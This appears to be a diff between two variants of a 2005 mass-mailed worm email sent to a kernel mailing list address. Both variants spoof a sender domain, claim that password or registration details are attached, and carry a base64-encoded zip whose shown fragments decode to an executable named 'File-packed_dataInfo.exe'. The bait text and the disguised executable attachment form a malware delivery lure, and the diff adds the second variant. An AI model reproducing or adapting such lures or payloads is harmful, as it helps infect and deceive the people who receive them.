@@ -1,29 +1,29 @@
-From: hostmaster@si.com
-Subject: Your Password
-Date: Thu, 15 Dec 2005 20:51:23 GMT
-Message-ID: <c16abeeb8186cc83@si.com>
+From: info@rediff.com
+Subject: Registration_Confirmation
+Date: Thu, 15 Dec 2005 20:30:29 UTC
+Message-ID: <3bb2abf80dc82286855f@rediff.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="======6b8ffc0ac3.c5"
+Content-Type: multipart/mixed; boundary="===8d4e82d4a11.8f7be"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: Z-User99@oss.sgi.com
+To: MailIn_Box9775@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---======6b8ffc0ac3.c5
+--===8d4e82d4a11.8f7be
 
-Protected message is attached!
+Account and Password Information are attached!
 
 
-***** Go to: http://www.si.com
-***** Email: postman@si.com
---======6b8ffc0ac3.c5
-Content-Type: application/octet-stream; name=reg_pass.zip
+***** Go to: http://www.rediff.com
+***** Email: postman@rediff.com
+--===8d4e82d4a11.8f7be
+Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass.zip"
+Content-Disposition: attachment; filename="reg_pass-data.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---======6b8ffc0ac3.c5--
+--===8d4e82d4a11.8f7be--
